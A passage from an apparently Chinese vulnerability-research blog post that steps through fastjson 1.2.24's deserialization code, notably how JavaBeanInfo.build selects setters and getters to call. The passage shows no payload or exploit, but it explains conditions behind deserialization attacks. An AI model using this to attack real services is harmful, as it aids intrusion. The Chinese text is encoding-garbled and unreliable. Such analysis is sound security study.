class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (classLoader != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// ä¼ å…¥çš„æ˜¯é»˜è®¤ç±»åŠ è½½å™¨ï¼Œé»˜è®¤æƒ…å†µä¸‹ä¸ºnull,æ‰€ä»¥æ­¤å¤„å¿½ç•¥</span><br>            ...<br>        &#125;<br>    &#125; <br><br>    <span class="hljs-keyword">try</span> &#123;<br>        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();<span class="hljs-comment">// è·å–ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨</span><br><br>        <span class="hljs-keyword">if</span> (contextClassLoader != <span class="hljs-keyword">null</span>) &#123;<br>            clazz = contextClassLoader.loadClass(className);<span class="hljs-comment">// åŠ è½½ç±»</span><br>            mappings.put(className, clazz);<span class="hljs-comment">// å°†è¯¥ç±»æ·»åŠ è‡³mappingsä¸­ï¼Œçœçš„ä¸‹æ¬¡å†åŠ è½½äº†</span><br><br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>        <span class="hljs-comment">// skip</span><br>    &#125;<br><br>    <span class="hljs-keyword">try</span> <br>        clazz = Class.forName(className);<span class="hljs-comment">// æœ‰äº›ç±»loadClassåŠ è½½ä¸äº†ï¼Œæ‰€ä»¥åœ¨æ¥ä¸ªforNameè¡¥å……ä¸€ä¸‹</span><br>        mappings.put(className, clazz);<br><br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125; ...<br><br>    <span class="hljs-keyword">return</span> clazz;<span class="hljs-comment">// å¦‚æœä¸Šé¢éƒ½æä¸å®šï¼Œé‚£å°±å¯„ï¼Œè¿”å›ä¸ªnull</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆæ˜¯ä¸€å †åˆ¤æ–­ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯æ²¡å•¥æ“ä½œï¼Œç„¶åæ¥åˆ°è·å–ååºåˆ—åŒ–å™¨çš„åœ°æ–¹ï¼Œè·Ÿè¿›è¿™é‡Œ</p><p><img src="/2022/11/12/fastjson1.2.24/7.png"></p><p>æ¥åˆ°<code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.reflect.Type)</code></p><p><img src="/2022/11/12/fastjson1.2.24/8.png"></p><p>æ¥åˆ°<code>com.alibaba.fastjson.parser.ParserConfig#getDeserializer(java.lang.Class&lt;?&gt;, java.lang.reflect.Type)</code>è¿™é‡Œä¹Ÿéƒ½æ˜¯å¾ˆå¤šåˆ¤æ–­ï¼Œç„¶åå°±æŒ‘æŒ‘æ¡æ¡æˆªä¸‹å›¾ï¼Œéƒ½æ˜¯ä¸€äº›åŸºæœ¬çš„åˆ¤æ–­ï¼Œæˆ–è€…æ˜¯å¼€å‘è€ƒè™‘åˆ°çš„ä¸€äº›å…¶ä»–å› ç´ </p><p><img src="/2022/11/12/fastjson1.2.24/9.png"></p><p>ä¸€è·¯å‘ä¸‹ï¼Œæ¥åˆ°è¯¥æ–¹æ³•çš„æœ€åº•éƒ¨ï¼Œä¸Šé¢çš„åˆ¤æ–­åœ¨æ™®é€šçš„JavaBeanåŸºæœ¬ä¸Šéƒ½ä¸ä¼šå®ç°ï¼Œæ‰€ä»¥é€šå¸¸æƒ…å†µä¸‹éƒ½ä¼šèµ°åˆ°è¿™é‡Œ</p><p><img src="/2022/11/12/fastjson1.2.24/10.png"></p><p>æ¥åˆ°<code>com.alibaba.fastjson.parser.ParserConfig#createJavaBeanDeserializer</code>é¦–å…ˆéœ€è¦æ³¨æ„ä¸‹ASMï¼šASM æ˜¯ä¸€ä¸ª <strong>Javaå­—èŠ‚ç </strong>æ“æ§æ¡†æ¶ã€‚å®ƒèƒ½å¤Ÿä»¥<strong>äºŒè¿›åˆ¶å½¢å¼</strong>ä¿®æ”¹å·²æœ‰ç±»æˆ–è€…åŠ¨æ€ç”Ÿæˆç±»ã€‚è¿™ä¸ªå…¶å®ä¸»è¦å…³æ³¨çš„å°±æ˜¯åœ¨ä¸‹é¢ï¼Œæœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œæ ¹æ®<code>asmEnable</code>æ¥å†³å®šæ˜¯ä½¿ç”¨åŠ¨æ€åˆ›å»ºçš„ååºåˆ—åŒ–å™¨è¿˜æ˜¯fastJsonä¸­å†™å¥½çš„ååºåˆ—åŒ–å™¨ï¼Œä¸¤è€…åŸºæœ¬æ²¡å¤šå¤§åŒºåˆ«ï¼Œåªä¸è¿‡åŠ¨æ€åˆ›å»ºçš„æ— æ³•è°ƒè¯•</p><p><img src="/2022/11/12/fastjson1.2.24/11.png"></p><p>æ¥ä¸‹æ¥åˆæ˜¯ä¸€å †åˆ¤æ–­ï¼Œç›´æ¥å‘ä¸‹ï¼Œæ¥åˆ°ï¼Œè·Ÿè¿›<code>JavaBeanInfo.build()</code></p><p><img src="/2022/11/12/fastjson1.2.24/12.png"></p><p>æ¥åˆ°<code>com.alibaba.fastjson.util.JavaBeanInfo#build</code>å¯ä»¥å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•ï¼Œå¤§è‡´åšäº†å“ªäº›äº‹æƒ…</p><p><img src="/2022/11/12/fastjson1.2.24/13.png"></p><p>è¯¥æ–¹æ³•ä¸­ï¼Œå…¶å®æœ€éœ€è¦å…³æ³¨çš„å°±æ˜¯é‚£ä¸‰ä¸ªforå¾ªç¯ï¼Œä¸Šé¢çš„ä¹Ÿéƒ½æ˜¯ä¸€äº›åˆ›å»ºå’Œå¾ªç¯ä¹‹ç±»çš„ä¸œè¥¿</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Method method : methods) &#123; <span class="hljs-comment">//å¼€å§‹éå†æ‰€æœ‰publicæ–¹æ³•</span><br>    <span class="hljs-keyword">int</span> ordinal = <span class="hljs-number">0</span>, serialzeFeatures = <span class="hljs-number">0</span>, parserFeatures = <span class="hljs-number">0</span>;<br>    String methodName = method.getName();<br>    <span class="hljs-keyword">if</span> (methodName.length() &lt; <span class="hljs-number">4</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;<span class="hljs-comment">// æ–¹æ³•åå°äº4ç›´æ¥è·³è¿‡</span><br><br>    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<span class="hljs-keyword">continue</span>;&#125;<span class="hljs-comment">// é™æ€æ–¹æ³•ç›´æ¥è·³è¿‡</span><br><br>    <span class="hljs-comment">// support builder setè¿”å›ç±»å‹æ˜¯å¦æ˜¯ç©ºï¼Œæˆ–è¿”å›ç±»å‹å’Œåº•å±‚æˆå‘˜ç±»å‹ç›¸åŒ(ååŠéƒ¨åˆ†æˆ‘ä¸ç†è§£)</span><br>    <span class="hljs-keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;<span class="hljs-keyword">continue</span>;&#125;<br>    <br>    Class&lt;?&gt;[] types = method.getParameterTypes();<br>    <span class="hljs-keyword">if</span> (types.length != <span class="hljs-number">1</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;<span class="hljs-comment">// çœ‹æœ‰å‡ ä¸ªå‚æ•°</span><br><br>    JSONField annotation = method.getAnnotation(JSONField.class);<span class="hljs-comment">// åˆæ˜¯é‚£ä¸ªæ³¨è§£ï¼Œè·³è¿‡</span><br><br>    <span class="hljs-keyword">if</span> (annotation == <span class="hljs-keyword">null</span>) &#123;annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);&#125;<br><br>    <span class="hljs-keyword">if</span> (annotation != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!annotation.deserialize()) &#123;<span class="hljs-keyword">continue</span>;&#125;<span class="hljs-comment">// å¿½ç•¥</span><br>...<br>        &#125;<br>    &#125;<br><span class="hljs-comment">// TODO &quot;set&quot;çš„åˆ¤æ–­æ”¾åœ¨ JSONField æ³¨è§£åé¢ï¼Œæ„æ€æ˜¯å…è®¸é setter æ–¹æ³•æ ‡è®° JSONField æ³¨è§£</span><br><span class="hljs-comment">// åˆ¤æ–­è¯¥æ–¹æ³•æ˜¯å¦æ˜¯ä»¥setå¼€å¤´ï¼Œä»è¿™é‡Œèƒ½å¤Ÿçœ‹å‡ºæ¥å·®ä¸å¤šå°±æ˜¯åœ¨æ‰¾setteræ–¹æ³•</span><br>    <span class="hljs-keyword">if</span> (!methodName.startsWith(<span class="hljs-string">&quot;set&quot;</span>)) &#123; <br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">char</span> c3 = methodName.charAt(<span class="hljs-number">3</span>);<br><br>    String propertyName;<br>    <span class="hljs-keyword">if</span> (Character.isUpperCase(c3) <span class="hljs-comment">//æ–¹æ³•åçš„ç¬¬4ä½æ˜¯å¦æ˜¯å¤§å†™ï¼Œæˆ–è€…æ˜¯Unicodeç¼–ç </span><br>        || c3 &gt; <span class="hljs-number">512</span> <span class="hljs-comment">// for unicode method name</span><br>       ) &#123;<br>        <span class="hljs-keyword">if</span> (TypeUtils.compatibleWithJavaBean) &#123;<span class="hljs-comment">// é»˜è®¤false</span><br>            propertyName = TypeUtils.decapitalize(methodName.substring(<span class="hljs-number">3</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// è·å–å°å†™çš„æ–¹æ³•åï¼Œåˆ é™¤setéƒ¨åˆ†ï¼Œå–åé¢çš„éƒ¨åˆ†</span><br>            propertyName = Character.toLowerCase(methodName.charAt(<span class="hljs-number">3</span>)) + methodName.substring(<span class="hljs-number">4</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">&#x27;_&#x27;</span>) &#123;<span class="hljs-comment">// ä¸ä¸€æ ·çš„å†™æ³•</span><br>        propertyName = methodName.substring(<span class="hljs-number">4</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c3 == <span class="hljs-string">&#x27;f&#x27;</span>) &#123;<span class="hljs-comment">// ä¸ä¸€æ ·çš„å†™æ³•</span><br>        propertyName = methodName.substring(<span class="hljs-number">3</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (methodName.length() &gt;= <span class="hljs-number">5</span> &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="hljs-number">4</span>))) &#123;<span class="hljs-comment">// ä¸ä¸€æ ·çš„å†™æ³•</span><br>        propertyName = TypeUtils.decapitalize(methodName.substring(<span class="hljs-number">3</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br><span class="hljs-comment">// è¿™éƒ¨åˆ†å…¶å®ä¹Ÿå¼•å…¥äº†å¦ä¸€ä¸ªç‚¹ï¼šå°±æ˜¯æ— éœ€å­˜åœ¨å¯¹åº”çš„å­—æ®µï¼Œåªéœ€è¦å­˜åœ¨ç¬¦åˆæ¡ä»¶çš„setteræ–¹æ³•</span><br>    Field field = TypeUtils.getField(clazz, propertyName, declaredFields);<span class="hljs-comment">// ä»fieldä¸­æŸ¥ä¸€ä¸‹æ˜¯å¦å­˜åœ¨å¯¹åº”çš„å­—æ®µ</span><br>    <span class="hljs-keyword">if</span> (field == <span class="hljs-keyword">null</span> &amp;&amp; types[<span class="hljs-number">0</span>] == <span class="hljs-keyword">boolean</span>.class) &#123;<span class="hljs-comment">// æ²¡æœ‰æ‰¾åˆ°åŒåçš„,å¹¶ä¸”å‚æ•°ç±»å‹æ—¶booleanåˆ™è¿›å…¥</span><br>        String isFieldName = <span class="hljs-string">&quot;is&quot;</span> + Character.toUpperCase(propertyName.charAt(<span class="hljs-number">0</span>)) + propertyName.substring(<span class="hljs-number">1</span>);<br>        field = TypeUtils.getField(clazz, isFieldName, declaredFields);<br>    &#125;<br><br>    JSONField fieldAnnotation = <span class="hljs-keyword">null</span>;<span class="hljs-comment">// åˆæ˜¯é‚£ä¸ªæ³¨è§£</span><br>    <span class="hljs-keyword">if</span> (field != <span class="hljs-keyword">null</span>) &#123;<br>        fieldAnnotation = field.getAnnotation(JSONField.class);<span class="hljs-comment">// çœ‹ä¸€ä¸‹è¯¥å­—æ®µä¸Šé¢æœ‰æ²¡æœ‰JSONTypeæ³¨è§£</span><br><br>        <span class="hljs-keyword">if</span> (fieldAnnotation != <span class="hljs-keyword">null</span>) &#123;<br>            ...&#125;<span class="hljs-comment">// æ²¡é‚£ä¸ªæ³¨è§£ï¼Œè¿›ä¸å»</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (propertyNamingStrategy != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-comment">// è¿™ä¸ªä¸€èˆ¬ä¹Ÿè¿›ä¸å»</span><br>    &#125;<br><span class="hljs-comment">// åˆ›å»ºFieldInfoï¼Œå¹¶ä¸”æ·»åŠ åˆ°fieldList</span><br>    add(fieldList, <span class="hljs-keyword">new</span> FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,<br>                                 annotation, fieldAnnotation, <span class="hljs-keyword">null</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹è¿™ä¸ªå¾ªç¯ï¼Œéå†æ‰€æœ‰publicæ–¹æ³•ï¼Œæ‰¾å‡ºç¬¦åˆæ¡ä»¶çš„setteræ–¹æ³•ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹æ¡ä»¶ï¼š</p><ol><li>publicä¿®é¥°</li><li>ä¸æ˜¯é™æ€æ–¹æ³•</li><li>ä»¥setå¼€å¤´ï¼Œå¹¶ä¸”æ–¹æ³•åå¤§äº4</li><li>å‚æ•°åªæœ‰1ä¸ª</li><li>è¿”å›å€¼æ˜¯å¦ä¸ºç©º</li></ol><p>åœ¨æ¥çœ‹ç¬¬äºŒä¸ªforå¾ªç¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Field field : clazz.getFields()) &#123; <span class="hljs-comment">// public static fields</span><br>    <span class="hljs-keyword">int</span> modifiers = field.getModifiers();<span class="hljs-comment">// è·å–fieldçš„ä¿®é¥°ç¬¦</span><br>    <span class="hljs-keyword">if</span> ((modifiers &amp; Modifier.STATIC) != <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;<span class="hljs-comment">// åˆ¤æ–­æ˜¯å¦æ˜¯é™æ€å±æ€§</span><br><br>    <span class="hljs-keyword">if</span>((modifiers &amp; Modifier.FINAL) != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// æ˜¯å¦æ˜¯finalä¿®é¥°çš„å±æ€§</span><br>        ...&#125;<br><br>    <span class="hljs-keyword">boolean</span> contains = <span class="hljs-keyword">false</span>;<br>    <span class="hljs-keyword">for</span> (FieldInfo item : fieldList) &#123;<br>        <span class="hljs-keyword">if</span> (item.name.equals(field.getName())) &#123;<span class="hljs-comment">// è¿™æ˜¯çŒœæµ‹å°±æ˜¯ç”¨äºæŸ¥ç¼ºè¡¥æ¼ï¼Œå¦‚æœæœ‰fieldï¼Œå´æ²¡æœ‰å¯¹åº”çš„setæ–¹æ³•</span><br>            contains = <span class="hljs-keyword">true</span>;<br>            <span class="hljs-keyword">break</span>; <span class="hljs-comment">// å·²ç»æ˜¯ contains = trueï¼Œæ— éœ€ç»§ç»­éå†</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (contains) &#123;<span class="hljs-keyword">continue</span>;&#125;<span class="hljs-comment">// è·³å›ï¼Œç„¶åéå†ä¸‹ä¸€ä¸ªfield</span><br><span class="hljs-comment">// å½“æœ‰field,å´æ²¡æœ‰å¯¹åº”çš„setæ–¹æ³•æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œä¸‹é¢ï¼Œå…¶å®ä¹Ÿå¯ä»¥ä¸çœ‹</span><br>    <span class="hljs-keyword">int</span> ordinal = <span class="hljs-number">0</span>, serialzeFeatures = <span class="hljs-number">0</span>, parserFeatures = <span class="hljs-number">0</span>;<br>    String propertyName = field.getName();<br><br>    JSONField fieldAnnotation = field.getAnnotation(JSONField.class);<br><br>    <span class="hljs-keyword">if</span> (fieldAnnotation != <span class="hljs-keyword">null</span>) &#123;...&#125;<span class="hljs-comment">// åˆæ˜¯é‚£ä¸ªæ³¨è§£çš„ä¸œè¥¿</span><br><br>    <span class="hljs-keyword">if</span> (propertyNamingStrategy != <span class="hljs-keyword">null</span>) &#123;<br>        propertyName = propertyNamingStrategy.translate(propertyName);<br>    &#125;<br><span class="hljs-comment">// æŠŠé‚£ä¸ªæ²¡æœ‰setæ–¹æ³•çš„ fieldä¹Ÿæ·»åŠ è‡³fieldListç»ˆ</span><br>    add(fieldList, <span class="hljs-keyword">new</span> FieldInfo(propertyName, <span class="hljs-keyword">null</span>, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, <span class="hljs-keyword">null</span>,<br>                                 fieldAnnotation, <span class="hljs-keyword">null</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ï¼šæ„Ÿè§‰è¿™ä¸ªå¾ªç¯æ›´åƒæ˜¯ä¸ªå·®ç¼ºè¡¥æ¼ï¼Œæ€•é—æ¼çš„æŸä¸ªå­—æ®µ</p><p>ç¬¬ä¸‰ä¸ªforå¾ªç¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Method method : clazz.getMethods()) &#123; <span class="hljs-comment">// getter methodsè·å–publicä¿®é¥°çš„ç¬¦åˆæ¡ä»¶çš„getæ–¹æ³•</span><br>    String methodName = method.getName();<br>    <span class="hljs-keyword">if</span> (methodName.length() &lt; <span class="hljs-number">4</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;<span class="hljs-comment">// åç§°é•¿åº¦å¤§äº4</span><br><br>    <span class="hljs-keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;<span class="hljs-keyword">continue</span>;&#125;<span class="hljs-comment">// æ˜¯å¦æ˜¯é™æ€æ–¹æ³•</span><br><span class="hljs-comment">// ä»¥getå¼€å¤´ï¼Œå¹¶ä¸”ç¬¬å››ä½å¤§å†™</span><br>    <span class="hljs-keyword">if</span> (methodName.startsWith(<span class="hljs-string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="hljs-number">3</span>))) &#123;<br>        <span class="hljs-keyword">if</span> (method.getParameterTypes().length != <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">continue</span>;&#125;<br><span class="hljs-comment">// å½“è¿”å›å€¼æ˜¯Collection/Map/AtomicBoolean/AtomicInteger/AtomicLong  è¿›å…¥</span><br>        <span class="hljs-keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="hljs-comment">//</span><br>            || Map.class.isAssignableFrom(method.getReturnType()) <span class="hljs-comment">//</span><br>            || AtomicBoolean.class == method.getReturnType() <span class="hljs-comment">//</span><br>            || AtomicInteger.class == method.getReturnType() <span class="hljs-comment">//</span><br>            || AtomicLong.class == method.getReturnType() <span class="hljs-comment">//</span><br>           ) &#123;<br>            String propertyName;<br><br>            JSONField annotation = method.getAnnotation(JSONField.class);<span class="hljs-comment">// è¾£ä¸ªæ³¨è§£</span><br>            <span class="hljs-keyword">if</span> (annotation != <span class="hljs-keyword">null</span> &amp;&amp; annotation.deserialize()) &#123;<span class="hljs-keyword">continue</span>;&#125;<br><br>            <span class="hljs-keyword">if</span> (annotation != <span class="hljs-keyword">null</span> &amp;&amp; annotation.name().length() &gt; <span class="hljs-number">0</span>) &#123;propertyName = annotation.name();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                propertyName = Character.toLowerCase(methodName.charAt(<span class="hljs-number">3</span>)) + methodName.substring(<span class="hljs-number">4</span>);<br>            &#125;<br><br>            FieldInfo fieldInfo = getField(fieldList, propertyName);<br>            <span class="hljs-keyword">if</span> (fieldInfo != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (propertyNamingStrategy != <span class="hljs-keyword">null</span>) &#123;<br>                propertyName = propertyNamingStrategy.translate(propertyName);<br>            &#125;<br><span class="hljs-comment">// ä¹Ÿå°±æ˜¯è¿”å›ç±»å‹å¿…é¡»ç¬¦åˆè¦æ±‚æ‰èƒ½å°†æŸäº›getæ–¹æ³•æ·»åŠ è‡³fieldList</span><br>            add(fieldList, <span class="hljs-keyword">new</span> FieldInfo(propertyName, method, <span class="hljs-keyword">null</span>, clazz, type, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, annotation, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‰ä¸ªå¾ªç¯ç»“æŸï¼Œç„¶å<code>new JavaBeanInfo()</code>ï¼Œç„¶åå°±è¿”å›äº†ï¼Œæ¥çœ‹ä¸€ä¸‹JavaBeanInfoé‡Œé¢æœ‰å•¥</p><p><img src="/2022/11/12/fastjson1.2.24/14.png"></p><p>ç®€å•æ€»ç»“ä¸€ä¸‹<code>JavaBeanInfo.build()</code>ï¼Œè·å–æŒ‡å®šç±»çš„æ„é€ å™¨ã€å­—æ®µã€ä»¥åŠä¸€äº›ç¬¦åˆæ¡ä»¶çš„getteræ–¹æ³•ï¼Œåªä¸è¿‡å­˜å‚¨çš„å½¢å¼è¿˜æ˜¯ç›¸å½“äºæ˜¯å­—æ®µï¼Œå‘ä¸‹èµ°ï¼Œæ¥åˆ°åˆä¸€ä¸ª<code>JavaBeanInfo.build()</code></p><p><img src="/2022/11/12/fastjson1.2.24/15.png"></p><p>æ”¹asmEnableæœ‰ä¸¤ç§ç®€å•çš„æ–¹å¼ï¼Œä¸€ç§æ˜¯IDEAç›´æ¥æ”¹ï¼Œå¦ä¸€ç§æ˜¯å‚è€ƒå¤§ä½¬çš„ï¼Œåœ¨JavaBeanä¸­æ·»åŠ ä¸€ä¸ªè¿”å›ç±»å‹ä¸º<code>Collection/Map/AtomicBoolean/AtomicInteger/AtomicLong</code>è¿™ç§å½¢å¼çš„getteræ–¹æ³•ï¼Œæˆ‘é€‰æ‹©IDEAç›´æ¥æ”¹ï¼Œç„¶åæ¥åˆ°äº†æˆ‘æƒ³å»çš„åœ°æ–¹</p><p><img src="/2022/11/12/fastjson1.2.24/16.png"></p><p>è¿™ä¸ªå…¶å®ä¹Ÿæ²¡å•¥å¥½çœ‹çš„ï¼Œå°±æ˜¯newäº†ä¸ªå¯¹è±¡ğŸ˜ï¼Œæœ€åå°±æ˜¯retrunè¿™ä¸ªååºåˆ—åŒ–å™¨äº†ï¼Œå…¶å®è¿™æ®µä¹Ÿæ²¡å•¥å¥½çœ‹çš„ï¼Œå› ä¸ºè¿™æ®µå•¥ä¹Ÿæ²¡è°ƒ</p><p><img src="/2022/11/12/fastjson1.2.24/17.png"></p><p>ä¸€è·¯è¿”å›ï¼Œæ¥åˆ°<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p><p>ååºåˆ—åŒ–å™¨å¼„å¥½äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ååºåˆ—åŒ–äº†</p><p><img src="/2022/11/12/fastjson1.2.24/18.png"></p><p>ä¸€è·¯è·Ÿè¿›ï¼Œç»è¿‡å‡ ä¸ªé‡è½½ï¼Œæ¥åˆ°<code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object, java.lang.Object, int)</code></p><p><img src="/2022/11/12/fastjson1.2.24/19.png"></p><p>æ¥ä¸‹æ¥åˆæ˜¯ä¸€å †åˆ¤æ–­äº†ï¼Œè·³è¿‡ä¸é‡è¦çš„æˆ–è€…æ²¡å¿…è¦å…³æ³¨çš„ï¼Œç›´æ¥æ¥åˆ°ä¸€ä¸ªæ¯”è¾ƒå…³é”®çš„forå¾ªç¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 